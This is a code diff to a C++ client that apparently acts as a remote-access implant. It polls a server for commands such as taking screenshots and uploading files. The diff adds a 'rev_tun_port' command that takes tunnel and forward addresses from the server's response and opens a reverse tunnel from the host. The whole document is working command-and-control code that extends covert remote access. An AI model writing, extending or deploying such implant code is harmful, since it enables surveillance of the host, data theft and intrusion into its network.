@@ -9,10 +9,14 @@
 #include "zlib.h"
 #include "ScreenCapture.h"
 #include "FileUtils.h" 
+#include "ctun.h"
+
+
 
 struct CommandInfo {
     std::string command;
     std::string uuid;
+    std::string extra;
 };
 
 size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
@@ -32,14 +36,16 @@ std::string extractCsrfToken(const std::string& htmlContent) {
     return "";
 }
 
-CommandInfo extractCommandAndUuidFromJson(const std::string& jsonResponse) {
+CommandInfo extractCommandInfoFromJson(const std::string& jsonResponse) {
     CommandInfo commandInfo;
-    
+
     std::regex commandRegex("\"command_executed\":\"([^\"]+)\"");
     std::regex uuidRegex("\"uuid\":\"([a-f0-9-]+)\"");
-    
+    std::regex extraRegex("\"extra\":\"([^\"]*)\"");
+
     std::smatch commandMatch;
     std::smatch uuidMatch;
+    std::smatch extraMatch;
 
     if (std::regex_search(jsonResponse, commandMatch, commandRegex)) {
         commandInfo.command = commandMatch[1].str();
@@ -47,6 +53,10 @@ CommandInfo extractCommandAndUuidFromJson(const std::string& jsonResponse) {
 
     if (std::regex_search(jsonResponse, uuidMatch, uuidRegex)) {
         commandInfo.uuid = uuidMatch[1].str();
+    }
+
+    if (std::regex_search(jsonResponse, extraMatch, extraRegex)) {
+        commandInfo.extra = extraMatch[1].str();
     }
 
     return commandInfo;
@@ -146,7 +156,7 @@ int main() {
             std::cout << htmlContent << std::endl;
         }
 
-        CommandInfo commandInfo = extractCommandAndUuidFromJson(htmlContent);
+        CommandInfo commandInfo = extractCommandInfoFromJson(htmlContent);
         if (commandInfo.command == "get_screenshot") {
             std::cout << "Extracted Command: " << commandInfo.command << std::endl;
             std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;
@@ -189,6 +199,32 @@ int main() {
             } else {
                 std::cout << "File uploaded successfully!" << std::endl;
             }
+            
+        } else if (commandInfo.command == "rev_tun_port") {
+            std::cout << "Executing reverse tunneling..." << std::endl;
+            std::regex addressPortRegex("\\(\\s*([^:]+):(\\d+)\\s*\\)\\s*\\(\\s*([^:]+):(\\d+)\\s*\\)");
+            
+
+            std::smatch addressPortMatch;
+
+            if (std::regex_search(commandInfo.extra, addressPortMatch, addressPortRegex)) {
+                std::string adresseTunnel = addressPortMatch[1].str();
+                int portTunnel = std::stoi(addressPortMatch[2].str());
+
+                std::string adresseForward = addressPortMatch[3].str();
+                int portForward = std::stoi(addressPortMatch[4].str());
+
+                std::pair<std::string, int> tunnelAddress(adresseTunnel, portTunnel);
+                std::pair<std::string, int> forwardAddress(adresseForward, portForward);
+
+                TunnelingClient tunnelingClient(tunnelAddress, forwardAddress);
+                tunnelingClient.startTunneling();
+
+                return 0;
+            } else {
+                std::cerr << "Invalid 'extra' format for reverse tunneling command." << std::endl;
+            }
+
         } else {
             std::cerr << "Unable to initialize cURL." << std::endl;
         }
